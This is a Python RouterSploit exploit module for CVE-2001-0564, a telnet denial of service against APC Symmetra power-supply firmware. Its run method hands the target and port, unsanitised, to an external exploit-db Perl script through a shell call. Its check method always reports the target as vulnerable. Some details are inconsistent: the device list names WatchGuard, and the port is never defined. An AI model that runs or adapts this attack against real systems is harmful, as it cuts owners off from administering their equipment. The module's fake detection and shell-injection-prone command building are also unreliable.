import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "CVE-2001-0564",

        "description": " A problem with the network software used with the Symmetra can allow a denial of service to the system, thus preventing "
                       "administrative access. This problem is due to the handling of the telnet protocol by the firmware of the power supply. The system "
                       "does not support more than one telnet session at a time, and when it encounters three failed login attempts, discontinues access for  "
                       "a configurable period between 1 and 10 minutes.",

        "authors": (

            "altomo",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/20654",

        ),

        "devices": (

            "watchguard, CVE-2001-0564"
        ),
    }

    target = OptIP(""," hostname ")
    time = OptString("","delay in seconds")


    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = "perl exploit-db-20654.pl {} {}".format(self.target,self.port)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True